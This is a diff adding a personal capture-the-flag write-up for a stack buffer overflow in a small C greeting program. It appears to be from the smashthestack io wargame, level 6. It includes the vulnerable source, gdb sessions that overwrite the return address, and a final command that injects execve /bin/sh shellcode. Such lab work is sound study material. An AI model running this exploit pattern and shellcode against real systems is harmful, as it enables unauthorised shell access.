@@ -1,0 +1,205 @@
+//written by bla
+//inspired by nnp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+enum{
+LANG_ENGLISH,
+LANG_FRANCAIS,
+LANG_DEUTSCH,
+};
+
+int language = LANG_ENGLISH;
+
+struct UserRecord{
+	char name[40];
+	char password[32];
+	int id;
+};
+
+void greetuser(struct UserRecord user){
+	char greeting[64];
+	switch(language){
+		case LANG_ENGLISH:
+			strcpy(greeting, "Hi "); break;
+		case LANG_FRANCAIS:
+			strcpy(greeting, "Bienvenue "); break;
+		case LANG_DEUTSCH:
+			strcpy(greeting, "Willkommen "); break;
+	}
+	strcat(greeting, user.name);
+	printf("%s\n", greeting);
+}
+
+int main(int argc, char **argv, char **env){
+	if(argc != 3) {
+		printf("USAGE: %s [name] [password]\n", argv[0]);
+		return 1;
+	}
+
+	struct UserRecord user = {0};
+	strncpy(user.name, argv[1], sizeof(user.name));
+	strncpy(user.password, argv[2], sizeof(user.password));
+
+	char *envlang = getenv("LANG");
+	if(envlang)
+		if(!memcmp(envlang, "fr", 2))
+			language = LANG_FRANCAIS;
+		else if(!memcmp(envlang, "de", 2))
+			language = LANG_DEUTSCH;
+
+	greetuser(user);
+}
+
+NOTE: $LANG has some effect on the stack layout, therefore, i try some case: fr and de
+
+case: fr 
+use gdb 
+export LANG="fr"
+
+(gdb) run $(python -c 'print "A"* 40 ') $(python -c 'print "B"* 32 ')
+Starting program: /levels/level06 $(python -c 'print "A"* 40 ') $(python -c 'print "B"* 32 ')
+Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) i r
+eax            0x53	83
+ecx            0xffffffff	-1
+edx            0xb7fcc878	-1208170376
+ebx            0xbffffc10	-1073742832
+esp            0xbffffbc0	0xbffffbc0
+ebp            0x42424242	0x42424242
+esi            0xbffffc5c	-1073742756
+edi            0xbffffc0c	-1073742836
+eip            0x42424242	0x42424242		// note
+eflags         0x10282	[ SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+register eip overwriten
+
+go on, i try run:
+
+(gdb) run $(python -c 'print "A"* 40 ') $(python -c 'print "B"* 28 + "C"*4 ')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /levels/level06 $(python -c 'print "A"* 40 ') $(python -c 'print "B"* 28 + "C"*4 ')
+Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434242 in ?? ()
+(gdb) i r
+eax            0x53	83
+ecx            0xffffffff	-1
+edx            0xb7fcc878	-1208170376
+ebx            0xbffffc10	-1073742832
+esp            0xbffffbc0	0xbffffbc0
+ebp            0x42424242	0x42424242
+esi            0xbffffc5c	-1073742756
+edi            0xbffffc0c	-1073742836
+eip            0x43434242	0x43434242		// note
+eflags         0x10282	[ SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+(gdb) run $(python -c 'print "A"* 40 ') $(python -c 'print "B"* 26 + "\xef\xbe\xad\xde"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /levels/level06 $(python -c 'print "A"* 40 ') $(python -c 'print "B"* 26 + "\xef\xbe\xad\xde"')
+Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBﾭ
+
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+(gdb) i r
+eax            0x51	81
+ecx            0xffffffff	-1
+edx            0xb7fcc878	-1208170376
+ebx            0xbffffc10	-1073742832
+esp            0xbffffbc0	0xbffffbc0
+ebp            0x42424242	0x42424242
+esi            0xbffffc5c	-1073742756
+edi            0xbffffc0c	-1073742836
+eip            0xdeadbeef	0xdeadbeef
+eflags         0x10282	[ SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+With that in mind, let’s stuff our shellcode into argv[1]. We’ll also leave some padding 0x41s on the ends of argv[1] and stick our shellcode right in the center somewhere. Might as well step through the binary at this point and see where our shellcode starts.
+
+run $(python -c 'print "A"*8 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80""A"*9 ') $(python -c 'print "B"* 26 + "\xef\xbe\xad\xde"')
+Starting program: /levels/level06 $(python -c 'print "A"*8 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80""A"*9 ') $(python -c 'print "B"* 26 + "\xef\xbe\xad\xde"')
+Bienvenue AAAAAAAA1�Ph//shh/bin��PS���
+                                      A1�Ph//shBBBBBBBBBBBBBBBBBBBBBBBBBBﾭ
+
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+(gdb) x/50x/ $esp
+A syntax error in expression, near `/ $esp'.
+(gdb) x/50x $esp
+0xbffffb10:	0x41414100	0x41414141	0x6850c031	0x68732f2f
+0xbffffb20:	0x69622f68	0x50e3896e	0xb0e18953	0x4180cd0b
+0xbffffb30:	0x6850c031	0x68732f2f	0x42424242	0x42424242
+0xbffffb40:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffb50:	0xbeef4242	0x0000dead	0x00000000	0x080482da
+0xbffffb60:	0x41414141	0x41414141	0x6850c031	0x68732f2f
+0xbffffb70:	0x69622f68	0x50e3896e	0xb0e18953	0x4180cd0b
+0xbffffb80:	0x6850c031	0x68732f2f	0x42424242	0x42424242
+0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffba0:	0xbeef4242	0x0000dead	0x00000000	0xbfffff8d
+0xbffffbb0:	0xb7fcb3c4	0xb7fff000	0x080486db	0xb7fcb000
+0xbffffbc0:	0x00000000	0x00000000	0x00000000	0xb7e3ba63
+0xbffffbd0:	0x00000003	0xbffffc64
+(gdb) x/20i $esp
+   0xbffffb10:	add    %al,0x41(%ecx)
+   0xbffffb13:	inc    %ecx
+   0xbffffb14:	inc    %ecx
+   0xbffffb15:	inc    %ecx
+   0xbffffb16:	inc    %ecx
+   0xbffffb17:	inc    %ecx
+   0xbffffb18:	xor    %eax,%eax    // start here but i don't understand ????
+   0xbffffb1a:	push   %eax
+   0xbffffb1b:	push   $0x68732f2f
+   0xbffffb20:	push   $0x6e69622f
+   0xbffffb25:	mov    %esp,%ebx
+   0xbffffb27:	push   %eax
+   0xbffffb28:	push   %ebx
+   0xbffffb29:	mov    %esp,%ecx
+   0xbffffb2b:	mov    $0xb,%al
+   0xbffffb2d:	int    $0x80
+   0xbffffb2f:	inc    %ecx
+   0xbffffb30:	xor    %eax,%eax
+   0xbffffb32:	push   %eax
+   0xbffffb33:	push   $0x68732f2f
+
+
+address 0xbffffb18
+
+$(python -c 'print "A"*8 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*9') $(python -c 'print "B"* 26 + "\x18\xfb\xff\xbf"')
+
+http://ono-sendai.io/writeups/io-smashthestack-org-level-6-writeup/
+http://www.unixawy.com/smash-stack-level6/
+
+
+
+
+
+
+
+
+
